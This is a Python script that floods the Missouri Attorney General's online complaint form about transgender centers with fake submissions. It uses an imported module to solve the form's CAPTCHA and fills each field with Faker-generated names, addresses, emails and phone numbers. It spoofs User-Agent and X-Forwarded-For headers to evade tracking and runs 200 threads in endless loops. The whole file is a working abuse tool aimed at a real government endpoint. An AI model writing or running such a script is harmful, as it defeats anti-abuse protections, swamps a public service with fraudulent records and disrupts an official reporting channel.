import requests
from faker import Faker
from requests_toolbelt.multipart.encoder import MultipartEncoder
import fuck_missouri
import random
import threading
import time
import traceback
from lxml import html

faker = Faker()

def phone_number():
    return ''.join(str(random.randint(0, 9)) for _ in range(10))

def submit_form():
    while True:
        try:
            # Solve the CAPTCHA and get the data to submit
            captcha_resp = fuck_missouri.generate_captcha_token()
            print(f"Captcha solved | {captcha_resp['captcha-a']}")

            # Construct the request
            form_data = {
                "TextFieldController_4": faker.first_name(),
                "TextFieldController_5": faker.last_name(),
                "TextFieldController_1": faker.address().replace('\n', ' '),
                "TextFieldController_2": faker.city(),
                "DropdownListFieldController": random.choice(["ME", "MD", "MA", "MI", "MN", "MS"]),
                "TextFieldController_6": faker.zipcode(),
                "TextFieldController_0": faker.free_email(),
                "TextFieldController_3": phone_number(),
                "ParagraphTextFieldController": faker.sentence(),
            }

            form_data.update(captcha_resp)
            multipart_data = MultipartEncoder(fields=form_data)
            parsed_form_data = multipart_data.to_string().decode()

            headers = {
                "Content-Type": multipart_data.content_type,
                "User-Agent": faker.user_agent(),
                "X-Forwarded-For": faker.ipv4()
            }

            # Send the request
            response = requests.post('https://ago.mo.gov/file-a-complaint/transgender-center-concerns',
                params={ 'sf_cntrl_id': 'ctl00$MainContent$C001' },
                headers=headers,
                data=parsed_form_data
            )

            # Parse success from the response HTML
            if "Success! Thanks for filling out our form!" in response.text:
                print("Response successfully submitted")
                continue
            
            # Parse possible error from the response HTML
            data = html.fromstring(response.text)
            reason = data.xpath('/html/body/main/div[2]/div[1]/div/div/div/text()')
            if reason != []:
                print(f"Failed to submit response, reason: {reason[0]}")
            else:
                print(f"Failed to submit response.")
                with open('index.html', 'w') as fp:
                    fp.write(response.text)
        except:
            print(traceback.format_exc())

for i in range(200):
    threading.Thread(target=submit_form, daemon=True).start()

while True:
    try:
        time.sleep(0.1)
    except KeyboardInterrupt:
        exit(0)